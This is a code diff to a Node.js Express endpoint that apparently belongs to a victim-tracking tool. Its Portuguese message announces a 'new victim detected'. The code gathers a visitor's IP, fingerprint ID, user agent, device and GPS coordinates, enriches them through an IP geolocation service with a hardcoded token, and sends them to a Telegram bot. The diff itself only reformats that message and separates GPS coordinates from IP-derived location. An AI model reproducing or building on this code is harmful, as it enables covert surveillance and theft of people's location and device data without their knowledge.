@@ -30,16 +30,17 @@ app.post('/log', async (req, res) => {
     const ipResponse = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`);
     const ipInfo = await ipResponse.json();
     const mensagem = `
-📡 NOVA VÍTIMA DETECTADA
-🧠 ID: ${data.visitorId}
-🌍 IP: ${data.ip}
-📍 Localização: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
-🏢 ISP: ${ipInfo.org}
-🕵️‍♂️ Agente: ${data.userAgent}
-📱 Dispositivo: ${data.device}
-🔗 Lat/Long: ${ipInfo.loc}
-📌 Lat/Long: ${data.loc || ipInfo.loc}
-`;
+    📡 NOVA VÍTIMA DETECTADA
+    🧠 ID: ${data.visitorId}
+    🌍 IP: ${data.ip}
+    📍 Localização: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
+    🏢 ISP: ${ipInfo.org}
+    🕵️‍♂️ Agente: ${data.userAgent}
+    📱 Dispositivo: ${data.device}
+    📌 Lat/Long (GPS): ${data.loc || "N/A"}
+    🔗 Lat/Long (IP): ${ipInfo.loc}
+    `;
+    
 
     const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
